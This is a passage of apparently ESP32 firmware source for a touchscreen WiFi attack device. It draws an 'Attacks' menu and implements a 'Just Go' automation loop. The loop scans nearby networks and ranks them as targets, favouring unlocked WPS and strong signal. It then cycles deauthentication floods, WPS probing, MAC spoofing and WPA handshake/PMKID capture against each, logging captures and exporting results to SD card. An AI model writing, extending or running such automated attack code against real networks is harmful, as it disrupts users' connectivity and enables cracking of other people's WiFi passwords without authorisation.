  const int railBtnW = railW - (railPad * 2);

  int by = railY + railPad;
  btnTargetSniff = {railX + railPad, by, railBtnW, railBtnH, targetOpsRunning ? "Stop" : "Start"};
  by += railBtnH + railGap;
  btnTargetAutomate = {railX + railPad, by, railBtnW, railBtnH, "Attack"};
  by += railBtnH + railGap;
  btnTargetMonitor = {railX + railPad, by, railBtnW, railBtnH, "Monitor"};
  by += railBtnH + railGap;
  btnTargetLock = {railX + railPad, by, railBtnW, railBtnH, lockChannel ? "Locked" : "Lock"};
  btnTargetBack = {railX + railPad, backBtnY, railBtnW, backBtnH, "Back"};

  int mainX = railX + railW + 6;
  int mainW = safeRight - mainX;
  if (mainW < 120) {
    mainX = content.x;
    mainW = safeRight - mainX;
  }
  if (mainW < 100) mainW = 100;

  int targetY = railY;
  int targetH = compact ? 76 : 84;
  int hudY = targetY + targetH + 6;
  int hudH = bottomEdge - hudY;
  if (hudH < (compact ? 44 : 62)) {
    targetH = max(compact ? 58 : 64, targetH - ((compact ? 44 : 62) - hudH));
    hudY = targetY + targetH + 6;
    hudH = bottomEdge - hudY;
  }

  tft.drawRect(railX, railY, railW, railH, TFT_CYAN);
  drawButton(btnTargetSniff, targetOpsRunning ? 0x7800 : 0x03A0,
             targetOpsRunning ? 0xFD20 : 0x7FE0, TFT_WHITE);                        // start/stop primary
  drawButton(btnTargetAutomate, 0x7800, 0xF800, TFT_WHITE);                         // attack red
  drawButton(btnTargetMonitor, 0x180F, 0xB81F, TFT_WHITE);                         // violet monitor
  drawButton(btnTargetLock, lockChannel ? 0x7800 : 0x4208, lockChannel ? 0xFD20 : 0x7BEF, TFT_WHITE);
  drawButton(btnTargetBack, 0x001A, 0x07FF, TFT_WHITE);

  tft.drawRect(mainX, targetY, mainW, targetH, TFT_MAGENTA);
  tft.setTextDatum(TL_DATUM);
  if (compact) { applyFontSm(); } else { applyFontMd(); }
  tft.setTextColor(lockChannel ? TFT_RED : TFT_CYAN, TFT_BLACK);
  tft.drawString(lockChannel ? "TARGET LOCKED" : "TARGET", mainX + 6, targetY + 5);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  auto drawTrimmed = [&](String s, int x, int y, int maxW, uint16_t col) {
    bool trimmed = false;
    while (s.length() > 4 && tft.textWidth(s) > maxW) {
      s.remove(s.length() - 1);
      trimmed = true;
    }
    if (trimmed && s.length() > 3) s += "...";
    while (s.length() > 4 && tft.textWidth(s) > maxW) s.remove(s.length() - 1);
    tft.setTextColor(col, TFT_BLACK);
    tft.drawString(s, x, y);
  };

  if (hasTarget) {
    String ssid = target.ssid.isEmpty() ? String("(hidden)") : target.ssid;
    drawTrimmed(String("SSID: ") + ssid, mainX + 8, targetY + (compact ? 24 : 30), mainW - 12, TFT_WHITE);
    drawTrimmed(String("CH:") + String(target.channel) + " RSSI:" + String(target.rssi) + "dBm SEC:" + String(authToStr(target.auth)),
                mainX + 8, targetY + (compact ? 38 : 46), mainW - 12, TFT_WHITE);
    drawTrimmed(String("BSSID: ") + target.bssid, mainX + 8, targetY + (compact ? 52 : 60), mainW - 12, 0xA71F);
  } else {
    tft.drawString("No target selected.", mainX + 8, targetY + 34);
  }

  // Per request: Live HUD extends to screen right/bottom with a 5px margin.
  const int hudW = rightEdge - mainX;
  tft.drawRect(mainX, hudY, hudW, hudH, TFT_CYAN);
  if (compact) { applyFontSm(); } else { applyFontMd(); }
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("LIVE HUD", mainX + 6, hudY + 4);
  applyFontSm();

  int lineY = hudY + (compact ? 18 : 24);
  const int lineGap = compact ? 12 : 14;
  char line[128];
  snprintf(line, sizeof(line), "mode:%s", autoModeStr(autoMode));
  drawTrimmed(String(line), mainX + 8, lineY, hudW - 12, TFT_WHITE);
  lineY += lineGap;
  snprintf(line, sizeof(line), "sniff:%s  lock:%s", sniffActive ? "ON" : "OFF", lockChannel ? "ON" : "OFF");
  drawTrimmed(String(line), mainX + 8, lineY, hudW - 12, 0x9DFF);
  lineY += lineGap;
  snprintf(line, sizeof(line), "pkts:%lu  pps:%d", (unsigned long)sniffPacketCount, sniffPps);
  drawTrimmed(String(line), mainX + 8, lineY, hudW - 12, 0x7BEF);
  lineY += lineGap;
  if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
    snprintf(line, sizeof(line), "HS:%d PMK:%d CL:%d",
             YoinkEngine::getHandshakeCount(),
             YoinkEngine::getPmkidCount(),
             YoinkEngine::getClientCount());
  } else if (autoMode == AutoMode::JAMMIT) {
    snprintf(line, sizeof(line), "jam:%u  deauth:%lu", (unsigned)jammitLastScore, (unsigned long)jammitDeauthCount);
  } else {
    snprintf(line, sizeof(line), "ch:%d  rssi:%ddBm",
             hasTarget ? target.channel : -1,
             hasTarget ? target.rssi : 0);
  }
  drawTrimmed(String(line), mainX + 8, lineY, hudW - 12, TFT_MAGENTA);

  drawBorder();
}

static void drawAutomateMenu() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Attacks");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();

  // Back button (bottom bar)
  btnAutoBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnAutoBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);

  // Target info
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (hasTarget) {
    tft.drawString(String("Target: ") + target.ssid, content.x + 4, content.y + 2);
  } else {
    tft.drawString("Target: (none)", content.x + 4, content.y + 2);
  }

  // Direct mode buttons: keep below the global top-button shift threshold,
  // and ensure 2x2 grid fits fully above bottom bar.
  const int pad = 10;
  const int gapX = 10;
  const int gapY = 8;
  const int minTop = UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 1;
  const int top = max(content.y + 16, minTop);
  const int bw = (w - (pad * 2) - gapX) / 2;
  const int maxGridH = (bottom.y - 26) - top;  // reserve space for "Active" row
  const int bh = clampi((maxGridH - gapY) / 2, 34, 46);

  btnAutoY0INK  = {pad,          top,              bw, bh, "Y0INK"};
  btnAutoRAW    = {pad + bw + gapX, top,           bw, bh, "SP3CTER"};
  btnAutoSCOPE  = {pad,          top + bh + gapY,  bw, bh, "SCOPE"};
  btnAutoJAMMIT = {pad + bw + gapX, top + bh + gapY, bw, bh, "JAMMIT"};

  drawButton(btnAutoY0INK,  autoMode == AutoMode::Y0INK  ? TFT_DARKGREEN : TFT_DARKCYAN,  TFT_MAGENTA, TFT_WHITE);
  drawButton(btnAutoRAW,    autoMode == AutoMode::SP3CTER    ? TFT_DARKGREEN : TFT_NAVY,      TFT_CYAN,    TFT_WHITE);
  drawButton(btnAutoSCOPE,  autoMode == AutoMode::SCOPE  ? TFT_DARKGREEN : TFT_MAROON,    TFT_CYAN,    TFT_WHITE);
  drawButton(btnAutoJAMMIT, autoMode == AutoMode::JAMMIT ? TFT_DARKGREEN : TFT_DARKGREY,  TFT_MAGENTA, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  const int activeY = top + (bh * 2) + gapY + 4;
  tft.drawString("Active:", 10, activeY);
  tft.drawString(autoModeStr(autoMode), 58, activeY);

  // Footer hints
  tft.setTextDatum(BC_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("Tap mode button to apply", w / 2, bottom.y - 2);

  uiLogLayout("drawAutomateMenu", content, bottom);
  uiLogButtonRect("Automate.Back", btnAutoBack);
  drawBorder();
}

// Forward declaration for shared monitor console logging.
static void monitorPushLine(uint16_t color, const char* fmt, ...);

static void justGoLogf(const char* fmt, ...) {
  char buf[32];
  va_list args;
  va_start(args, fmt);
  vsnprintf(buf, sizeof(buf), fmt, args);
  va_end(args);

  strncpy(justGoStatusLine, buf, sizeof(justGoStatusLine) - 1);
  justGoStatusLine[sizeof(justGoStatusLine) - 1] = '\0';
  monitorPushLine(TFT_CYAN, "%s", buf);
  pushConsoleEvent("INFO", "JUSTGO", buf);
  
  // Serial logging for debugging transparency
  Serial.printf("[JUSTGO] %s\n", buf);
}

static void justGoResetTargets() {
  justGoTargetCount = 0;
  justGoTargetPos = 0;
}

static bool justGoAcceptsTarget(const ApRecord& a) {
  if (a.bssid.length() < 11) return false;
  if (justGoWpaOnly) {
    if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) return false;
  }
  return true;
}

// ── Just Go session stats helpers ──────────────────────────────────────────

static void justGoResetSessionStats() {
  memset(justGoStats, 0, sizeof(justGoStats));
  justGoStatsCount = 0;
  justGoSessionSuccesses = 0;
  justGoSessionAttempts = 0;
}

static JustGoTargetStats* justGoFindStatsByBssid(const char* bssid) {
  for (uint8_t i = 0; i < justGoStatsCount; i++) {
    if (strncmp(justGoStats[i].bssid, bssid, 17) == 0) return &justGoStats[i];
  }
  return nullptr;
}

static JustGoTargetStats* justGoFindOrCreateStats(const ApRecord& a) {
  JustGoTargetStats* s = justGoFindStatsByBssid(a.bssid.c_str());
  if (s) return s;
  if (justGoStatsCount < JUSTGO_STATS_MAX) {
    s = &justGoStats[justGoStatsCount++];
  } else {
    // Evict the entry with the oldest lastTriedMs
    uint32_t oldest = justGoStats[0].lastTriedMs;
    uint8_t oidx = 0;
    for (uint8_t i = 1; i < JUSTGO_STATS_MAX; i++) {
      if (justGoStats[i].lastTriedMs < oldest) { oldest = justGoStats[i].lastTriedMs; oidx = i; }
    }
    s = &justGoStats[oidx];
  }
  memset(s, 0, sizeof(JustGoTargetStats));
  strncpy(s->bssid, a.bssid.c_str(), 17);
  s->bssid[17] = '\0';
  s->bestRssi = (int8_t)constrain(a.rssi, -128, 127);
  return s;
}

static void justGoRecordTargetAttempt(const ApRecord& a) {
  JustGoTargetStats* s = justGoFindOrCreateStats(a);
  if (!s) return;
  s->attempts++;
  s->lastTriedMs = millis();
  if (a.rssi > (int)s->bestRssi) s->bestRssi = (int8_t)constrain(a.rssi, -128, 127);
  justGoSessionAttempts++;
}

static void justGoRecordTargetSuccess(const ApRecord& a) {
  JustGoTargetStats* s = justGoFindOrCreateStats(a);
  if (!s) return;
  s->successes++;
  s->lastSuccessMs = millis();
  uint8_t hs  = YoinkEngine::isRunning() ? YoinkEngine::getHandshakeCount() : 0;
  uint8_t pmk = YoinkEngine::isRunning() ? YoinkEngine::getPmkidCount()    : 0;
  uint8_t cl  = YoinkEngine::isRunning() ? YoinkEngine::getClientCount()   : (uint8_t)min((uint32_t)255U, (uint32_t)jammitClientCount);
  if (hs  > s->hsMax)      s->hsMax      = hs;
  if (pmk > s->pmkidMax)   s->pmkidMax   = pmk;
  if (cl  > s->clientsMax) s->clientsMax = cl;
  justGoSessionSuccesses++;
}

static void justGoRecordModeOutcome(AutoMode mode, bool success) {
  if (!hasTarget) return;
  JustGoTargetStats* s = justGoFindStatsByBssid(target.bssid.c_str());
  if (!s) return;
  if (mode == AutoMode::Y0INK && !success) s->y0inkTimeouts++;
  if (mode == AutoMode::JAMMIT) {
    s->jammitRuns++;
    uint8_t cl = (uint8_t)min((uint32_t)255U, (uint32_t)jammitClientCount);
    if (cl > s->clientsMax) s->clientsMax = cl;
  }
}

static bool justGoHasCaptureSuccess() {
  if (YoinkEngine::isRunning())
    return (YoinkEngine::getHandshakeCount() > 0 || YoinkEngine::getPmkidCount() > 0);
  return false;
}

static bool justGoHasUsefulClientActivity() {
  if (justGoMode == AutoMode::Y0INK && YoinkEngine::isRunning())
    return YoinkEngine::getClientCount() > 0;
  if (justGoMode == AutoMode::JAMMIT) return jammitClientCount > 0;
  return false;
}

// Scoring: returns integer — higher = better target for this session
static int justGoScoreTarget(const ApRecord& a) {
  int score = 50;
  // WPA/WPA2/WPA3 bonus
  bool isWpa = (a.auth != WIFI_AUTH_OPEN && a.auth != WIFI_AUTH_WEP);
  if (isWpa) score += 10;
  // WPS vulnerability bonus — lab yield opportunity
  if      (a.wpsEnabled && !a.wpsLocked && a.wpsVersion == 0x10) score += 20; // WPS 1.0 unlocked
  else if (a.wpsEnabled && !a.wpsLocked)                          score += 10; // WPS unlocked
  else if (a.wpsEnabled &&  a.wpsLocked)                          score +=  5; // WPS present but locked
  // RSSI sweet spot -35 to -70 dBm
  if      (a.rssi >= -35)             score += 15; // very close
  else if (a.rssi >= -70)             score += 20; // ideal
  else if (a.rssi >= -82)             score +=  0; // marginal
  else                                score -= 15; // too weak
  // Per-session stats bonus/penalty
  JustGoTargetStats* s = justGoFindStatsByBssid(a.bssid.c_str());
  if (s) {
    if (s->clientsMax > 0)                   score += 10;
    if (s->hsMax > 0 || s->pmkidMax > 0)     score += 15;
    score -= (int)s->y0inkTimeouts * 5;
    if (s->successes > 0)                    score -= 20; // already captured, deprioritize
  }
  return score;
}

// ── Target list builder (scored) ───────────────────────────────────────────

static void justGoBuildTargetList() {
  justGoResetTargets();
  // Score every valid AP then pick the top-3 by score; no heap, O(n*3).
  static int scores[MAX_APS];
  for (int i = 0; i < apCount; i++) {
    scores[i] = justGoAcceptsTarget(aps[i]) ? justGoScoreTarget(aps[i]) : -9999;
  }
  for (uint8_t pick = 0; pick < 3; pick++) {
    int best = -9999; int bestIdx = -1;
    for (int i = 0; i < apCount; i++) {
      if (scores[i] <= -9999) continue;
      bool already = false;
      for (uint8_t j = 0; j < justGoTargetCount; j++)
        if (justGoTargets[j] == (uint8_t)i) { already = true; break; }
      if (already) continue;
      if (scores[i] > best) { best = scores[i]; bestIdx = i; }
    }
    if (bestIdx < 0) break;
    justGoTargets[justGoTargetCount++] = (uint8_t)bestIdx;
    Serial.printf("[JUSTGO-SCORE] rank=%u ssid=%s score=%d rssi=%d\n",
                  (unsigned)justGoTargetCount, aps[bestIdx].ssid.c_str(), best, aps[bestIdx].rssi);
    recordThreatAssessment(aps[bestIdx], 2);
  }
}

static uint32_t justGoModeDurationMs(AutoMode mode) {
  if (justGoSprayPray) {
    return 20000U; // quick cycling
  }
  // Duration varies by profile and mode
  switch (mode) {
    case AutoMode::PROBE_FLOOD:  return 30000U;
    case AutoMode::Y0INK:        return 90000U;
    case AutoMode::JAMMIT:       return 45000U;
    case AutoMode::SP3CTER:          return 45000U;
    case AutoMode::DEAUTH_FLOOD: return 45000U;
    case AutoMode::PUSH1T:       return 45000U;
    default: return 25000U;
  }
}

// Post-stimulus Y0INK retry uses a shorter window; otherwise use base duration.
static uint32_t justGoAdaptiveModeDurationMs(AutoMode mode) {
  if (mode == AutoMode::Y0INK && justGoPostStimulusWindow) return 45000U;
  return justGoModeDurationMs(mode);
}

// True if we should extend the current Y0INK window once (client seen, not yet extended).
static bool justGoShouldExtendY0INK(uint32_t now) {
  if (justGoY0inkExtendedOnce) return false;
  if (justGoMode != AutoMode::Y0INK) return false;
  const uint32_t maxMs = justGoAdaptiveModeDurationMs(AutoMode::Y0INK);
  const uint32_t elapsed = now - justGoStageStartMs;
  if (elapsed < (maxMs * 6) / 10) return false; // wait until 60% of window
  return justGoHasUsefulClientActivity() || justGoTargetHadPartial;
}

static uint8_t justGoSequenceLength(const ApRecord& a) {
  if (justGoSprayPray) return 3;
  
  // Profile-specific sequence lengths
  switch (justGoProfile) {
    case JustGoProfile::STEALTH:
      // STEALTH: Y0INK only (passive)
      return 1;
    
    case JustGoProfile::PROBE_FIRST:
      // PROBE_FIRST: PROBE + base sequence
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) return 2; // PROBE + RAW
      return 4; // PROBE + Y0INK + JAMMIT + RAW
    
    case JustGoProfile::CHAOS:
      // CHAOS: DEAUTH_FLOOD + RAW
      return 2;
    
    default: // STANDARD
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) return 1; // RAW only
      return 5; // Y0INK + PUSH1T + JAMMIT + Y0INK_RETRY + RAW
  }
}

static AutoMode justGoModeForStep(const ApRecord& a, uint8_t step) {
  if (justGoSprayPray) {
    if (step == 0) return AutoMode::Y0INK;
    if (step == 1) return AutoMode::JAMMIT;
    return AutoMode::SP3CTER;
  }
  
  // Profile-specific mode sequences
  switch (justGoProfile) {
    case JustGoProfile::STEALTH:
      // STEALTH: Y0INK only (passive handshake capture, no deauth)
      if (step == 0) return AutoMode::Y0INK;
      return AutoMode::NONE;
    
    case JustGoProfile::PROBE_FIRST:
      // PROBE_FIRST: Probe first to wake clients, then attack
      if (step == 0) return AutoMode::PROBE_FLOOD;
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) {
        // For open: PROBE + RAW
        if (step == 1) return AutoMode::SP3CTER;
      } else {
        // For WPA/WPA2: PROBE + Y0INK + JAMMIT + RAW
        if (step == 1) return AutoMode::Y0INK;
        if (step == 2) return AutoMode::JAMMIT;
        if (step == 3) return AutoMode::SP3CTER;
      }
      return AutoMode::NONE;
    
    case JustGoProfile::CHAOS:
      // CHAOS: Broadcast deauth flood + passive sniff
      if (step == 0) return AutoMode::DEAUTH_FLOOD;
      if (step == 1) return AutoMode::SP3CTER;
      return AutoMode::NONE;
    
    default: // STANDARD
      if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) {
        if (step == 0) return AutoMode::SP3CTER;
      } else {
        // WPA/WPA2/WPA3: Y0INK → PUSH1T → JAMMIT → Y0INK_RETRY → RAW
        if (step == 0) return AutoMode::Y0INK;
        if (step == 1) return AutoMode::PUSH1T; // WPS assessment
        if (step == 2) return AutoMode::JAMMIT;
        if (step == 3) return AutoMode::Y0INK;  // post-JAMMIT retry window
        if (step == 4) return AutoMode::SP3CTER;
      }
      return AutoMode::NONE;
  }
}

static void justGoStop() {
  justGoActive = false;
  justGoStage = JustGoStage::IDLE;
  justGoMode = AutoMode::NONE;
  justGoModeStep = 0;
  disengageAutoMode();
  if (sniffActive) stopSniff();
  
  // Summary on stop
  justGoLogf("~~ STOPPED ~~");
  uint32_t elapsed = (millis() - justGoStageStartMs) / 1000;
  justGoLogf("Ran for %lus", elapsed);
  if (justGoSessionAttempts > 0) {
    justGoLogf("[WIN] %u/%u captured", justGoSessionSuccesses, justGoSessionAttempts);
    Serial.printf("[JUSTGO-WIN] successes=%u attempts=%u\n",
                  (unsigned)justGoSessionSuccesses, (unsigned)justGoSessionAttempts);
  }
  Serial.printf("[JUSTGO-STOP] elapsed=%lu\n", elapsed);
  
  // THREAT EXPORT: Save JSON data for Android app analysis
  exportThreatDataToSD();
  
  // MAC SPOOF EXPORT: Save discovered/spoofed MACs to SD for Android analysis
  exportMacPoolToSD();
}

static void justGoStart() {
  justGoActive = true;
  justGoStage = JustGoStage::SCAN;
  justGoStageStartMs = millis();
  justGoMode = AutoMode::NONE;
  justGoModeStep = 0;
  justGoResetTargets();
  justGoResetSessionStats();
  justGoY0inkExtendedOnce = false;
  justGoPostStimulusWindow = false;
  justGoTargetHadClient    = false;
  justGoTargetHadPartial   = false;
  justGoTargetSucceeded    = false;
  monitorLineCount = 0;
  
  // Ensure spoofing mode matches profile
  updateSpoofModeFromProfile();
  activeSpoofMode = justGoSpoofMode;
  loadMacPoolFromSD();  // Load any previously discovered MACs
  
  // Enhanced startup message
  justGoLogf("=== JUST GO ===");
  justGoLogf("Starting automation...");
  char startMsg[128];
  snprintf(startMsg, sizeof(startMsg), "Profile:%s|Spoof:%s|Spray:%s",
           profileNames[(uint8_t)justGoProfile],
           spoofModeNames[(uint8_t)activeSpoofMode],
           justGoSprayPray ? "ON" : "OFF");
  justGoLogf(startMsg);
  Serial.printf("[JUSTGO-START] profile=%s spoof=%s spray=%d\n",
                profileNames[(uint8_t)justGoProfile],
                spoofModeNames[(uint8_t)activeSpoofMode],
                justGoSprayPray ? 1 : 0);
}

static void justGoPickTarget(uint32_t now) {
  if (justGoTargetCount == 0) {
    justGoStage = JustGoStage::SCAN;
    justGoStageStartMs = now;
    justGoLogf("JustGo: no targets; rescanning");
    return;
  }

  if (justGoTargetPos >= justGoTargetCount) justGoTargetPos = 0;
  const ApRecord& a = aps[justGoTargets[justGoTargetPos]];
  target = a;
  hasTarget = true;
  lockChannel = true;
  justGoTargetStartMs = now;
  justGoModeStep = 0;
  justGoMode = AutoMode::NONE;
  justGoStage = JustGoStage::RUN_MODE;
  justGoStageStartMs = now;
  
  // Enhanced target info logging
  char authStr[16] = "?";
  switch(a.auth) {
    case WIFI_AUTH_OPEN: strcpy(authStr, "OPEN"); break;
    case WIFI_AUTH_WEP: strcpy(authStr, "WEP"); break;
    case WIFI_AUTH_WPA_PSK: strcpy(authStr, "WPA"); break;
    case WIFI_AUTH_WPA2_PSK: strcpy(authStr, "WPA2"); break;
    case WIFI_AUTH_WPA_WPA2_PSK: strcpy(authStr, "WPA/WPA2"); break;
    case WIFI_AUTH_WPA3_PSK: strcpy(authStr, "WPA3"); break;
    default: strcpy(authStr, "OTHER"); break;
  }
  justGoLogf(">>> TARGET: %s", a.ssid.c_str());
  justGoLogf("Auth:%s|Ch:%u|RSSI:%d", authStr, (unsigned)a.channel, a.rssi);
  Serial.printf("[JUSTGO-TARGET] ssid=%s bssid=%s auth=%s ch=%u rssi=%d\n",
                a.ssid.c_str(), a.bssid.c_str(), authStr, a.channel, a.rssi);

  // Per-target session accounting + adaptive state reset
  justGoRecordTargetAttempt(a);
  justGoY0inkExtendedOnce = false;
  justGoPostStimulusWindow = false;
  justGoTargetHadClient    = false;
  justGoTargetHadPartial   = false;
  justGoTargetSucceeded    = false;

  int tgtScore = justGoScoreTarget(a);
  Serial.printf("[JUSTGO-SCORE] selected bssid=%s score=%d\n", a.bssid.c_str(), tgtScore);
  justGoLogf("Score:%d", tgtScore);
}

static void justGoAdvanceTarget(uint32_t now) {
  Serial.printf("[JUSTGO-RESULT] bssid=%s succeeded=%d hs=%u pmkid=%u clients=%u\n",
                hasTarget ? target.bssid.c_str() : "?",
                justGoTargetSucceeded ? 1 : 0,
                YoinkEngine::isRunning() ? YoinkEngine::getHandshakeCount() : 0,
                YoinkEngine::isRunning() ? YoinkEngine::getPmkidCount()    : 0,
                YoinkEngine::isRunning() ? YoinkEngine::getClientCount()   : (uint8_t)min((uint32_t)255U,(uint32_t)jammitClientCount));
  disengageAutoMode();
  justGoMode = AutoMode::NONE;
  justGoModeStep = 0;
  justGoTargetPos++;
  justGoStage = JustGoStage::SELECT_TARGET;
  justGoStageStartMs = now;
}

// Event-driven console update: only logs on state changes
static void justGoUpdateConsole() {
  if (!justGoActive) return;

  const uint32_t now = millis();
  
  // Check if mode changed
  if (justGoMode != justGoLastMode) {
    justGoLastMode = justGoMode;
    if (justGoMode != AutoMode::NONE && hasTarget) {
      uint32_t durationSec = justGoModeDurationMs(justGoMode) / 1000;
      const char* modeDesc = "?";
      if (justGoMode == AutoMode::Y0INK) {
        modeDesc = "Hunting handshakes...";
      } else if (justGoMode == AutoMode::PUSH1T) {
        modeDesc = "WPS probe & assessment...";
      } else if (justGoMode == AutoMode::JAMMIT) {
        modeDesc = "Launching deauth attack...";
      } else if (justGoMode == AutoMode::SP3CTER) {
        modeDesc = "Passive packet capture...";
      } else if (justGoMode == AutoMode::PROBE_FLOOD) {
        modeDesc = "Waking clients with probes...";
      } else if (justGoMode == AutoMode::DEAUTH_FLOOD) {
        modeDesc = "Broadcast channel deauth...";
      }
      justGoLogf("[%s] %s (%lus)", autoModeStr(justGoMode), modeDesc, durationSec);
    }
  }
  
  // Check if stage changed to COOLDOWN
  if (justGoStage == JustGoStage::COOLDOWN && justGoLastStage != JustGoStage::COOLDOWN) {
    justGoLogf("=== COOLDOWN ===");
    justGoLogf("Preparing next target...");
    Serial.printf("[JUSTGO-COOLDOWN] next_target_preparing\n");
  }
  
  justGoLastStage = justGoStage;
}

static void justGoTick() {
  if (!justGoActive) return;

  const uint32_t now = millis();
  
  // Update console telemetry periodically
  justGoUpdateConsole();
  
  switch (justGoStage) {
    case JustGoStage::SCAN:
      justGoLogf(">>> SCANNING...");
      doWifiScanBlocking();
      sortApsByRssiDesc();
      dedupeKeepStrongest();
      justGoBuildTargetList();
      if (justGoTargetCount > 0) {
        justGoLogf("Found %u targets", justGoTargetCount);
        Serial.printf("[JUSTGO-SCAN] targets_found=%u\n", justGoTargetCount);
      } else {
        justGoLogf("No targets, retry...");
      }
      justGoStage = JustGoStage::SELECT_TARGET;
      justGoStageStartMs = now;
      break;

    case JustGoStage::SELECT_TARGET:
      if (justGoTargetCount == 0) {
        if (now - justGoStageStartMs > 15000U) {
          justGoLogf("No targets found, rescanning...");
          justGoStage = JustGoStage::SCAN;
          justGoStageStartMs = now;
        }
        break;
      }
      justGoPickTarget(now);
      break;

    case JustGoStage::RUN_MODE: {
      if (justGoAutoHop) {
        uint32_t stayMs = (uint32_t)justGoStayMinutes * 60000U;
        if (stayMs > 0 && (now - justGoTargetStartMs) >= stayMs) {
          justGoAdvanceTarget(now);
          break;
        }
      }

      if (!hasTarget) {
        justGoStage = JustGoStage::SCAN;
        justGoStageStartMs = now;
        break;
      }

      const ApRecord& a = target;
      const uint8_t seqLen = justGoSequenceLength(a);
      if (justGoModeStep >= seqLen) {
        justGoStage = JustGoStage::COOLDOWN;
        justGoStageStartMs = now;
        break;
      }

      if (justGoMode == AutoMode::NONE) {
        AutoMode nextMode = justGoModeForStep(a, justGoModeStep);
        // Flag when entering the post-JAMMIT Y0INK retry window
        if (nextMode == AutoMode::Y0INK && justGoModeStep > 0) {
          justGoPostStimulusWindow = true;
          Serial.printf("[JUSTGO-ADAPT] entering post-stimulus Y0INK retry step=%u\n", justGoModeStep);
        }
        justGoMode = nextMode;
        justGoStageStartMs = now;
        engageAutoMode(justGoMode);

        const char* modeDesc = "?";
        if (justGoMode == AutoMode::Y0INK && justGoPostStimulusWindow)
          modeDesc = "Post-JAMMIT retry window...";
        else if (justGoMode == AutoMode::Y0INK)
          modeDesc = "Hunting handshakes...";
        else if (justGoMode == AutoMode::PUSH1T)
          modeDesc = "WPS probe & assessment...";
        else if (justGoMode == AutoMode::JAMMIT)
          modeDesc = "Launching deauth stimulus...";
        else if (justGoMode == AutoMode::SP3CTER)
          modeDesc = "Passive packet capture...";
        else if (justGoMode == AutoMode::PROBE_FLOOD)
          modeDesc = "Waking clients with probes...";
        else if (justGoMode == AutoMode::DEAUTH_FLOOD)
          modeDesc = "Broadcast channel deauth...";
        justGoLogf("[%s] %s", autoModeStr(justGoMode), modeDesc);
        Serial.printf("[JUSTGO-ENGAGE] mode=%s step=%u\n", autoModeStr(justGoMode), justGoModeStep);
        break;
      }

      // ── Y0INK live checks ───────────────────────────────────────────────
      if (justGoMode == AutoMode::Y0INK) {
        uint8_t hs    = YoinkEngine::isRunning() ? YoinkEngine::getHandshakeCount() : 0;
        uint8_t pmkid = YoinkEngine::isRunning() ? YoinkEngine::getPmkidCount()    : 0;
        uint8_t cl    = YoinkEngine::isRunning() ? YoinkEngine::getClientCount()   : 0;

        // Track evidence
        if (cl > 0)            justGoTargetHadClient  = true;
        if (hs > 0 || pmkid > 0) justGoTargetHadPartial = true;

        if (hs > 0 || pmkid > 0) {
          justGoLogf("[SUCCESS] %dHS + %dPMKID", hs, pmkid);
          justGoLogf("Y0INK captured - skip to RAW");
          Serial.printf("[JUSTGO-CAPTURE] handshakes=%d pmkids=%d\n", hs, pmkid);
          justGoTargetSucceeded = true;
          justGoRecordTargetSuccess(target);
          justGoRecordModeOutcome(AutoMode::Y0INK, true);
          disengageAutoMode();
          justGoMode = AutoMode::NONE;
          // Jump to last step (RAW) — skips JAMMIT and any remaining retry
          justGoModeStep = (seqLen > 1) ? (seqLen - 1) : seqLen;
          justGoStageStartMs = now;
          break;
        }

        // Extend Y0INK window once if clients are seen near timeout
        if (justGoShouldExtendY0INK(now)) {
          justGoY0inkExtendedOnce = true;
          justGoStageStartMs += 30000U; // push deadline 30 s later
          justGoLogf("[ADAPT] Y0INK+30s (client seen)");
          Serial.printf("[JUSTGO-ADAPT] y0ink_extended_30s cl=%u\n", cl);
        }
      }

      // ── Adaptive timeout ────────────────────────────────────────────────
      const uint32_t maxMs = justGoAdaptiveModeDurationMs(justGoMode);
      if ((now - justGoStageStartMs) >= maxMs) {
        if (justGoMode == AutoMode::Y0INK) {
          uint8_t clients = YoinkEngine::isRunning() ? YoinkEngine::getClientCount() : 0;
          uint8_t hs      = YoinkEngine::isRunning() ? YoinkEngine::getHandshakeCount() : 0;
          justGoLogf("Y0INK timeout %dC/%dHS", clients, hs);
          justGoRecordModeOutcome(AutoMode::Y0INK, false);
          // No clients and no partial evidence: skip JAMMIT + retry, go straight to RAW
          if (!justGoTargetHadClient && !justGoTargetHadPartial && seqLen >= 3) {
            Serial.printf("[JUSTGO-ADAPT] no_activity skip_to_raw step=%u->%u\n",
                          justGoModeStep, seqLen - 1);
            justGoLogf("[ADAPT] No activity, skip to RAW");
            disengageAutoMode();
            justGoMode = AutoMode::NONE;
            justGoModeStep = seqLen - 1;
            justGoStageStartMs = now;
            break;
          }
        } else if (justGoMode == AutoMode::JAMMIT) {
          justGoLogf("JAMMIT done %lu deauths", (unsigned long)jammitDeauthCount);
          justGoRecordModeOutcome(AutoMode::JAMMIT, false);
          // Mark so next Y0INK uses shorter post-stimulus window
          justGoPostStimulusWindow = true;
          Serial.printf("[JUSTGO-ADAPT] jammit_done post_stimulus_window=1\n");
        } else if (justGoMode == AutoMode::SP3CTER) {
          // SP3CTER success: PMKID captured or HS complete
          const bool spSuccess = (specterPmkidCount > 0);
          const bool spPartial = !spSuccess && (specterHsCount > 0);
          if (spSuccess) {
            justGoTargetSucceeded = true;
            justGoTargetHadPartial = true;
            justGoRecordTargetSuccess(target);
            justGoRecordModeOutcome(AutoMode::SP3CTER, true);
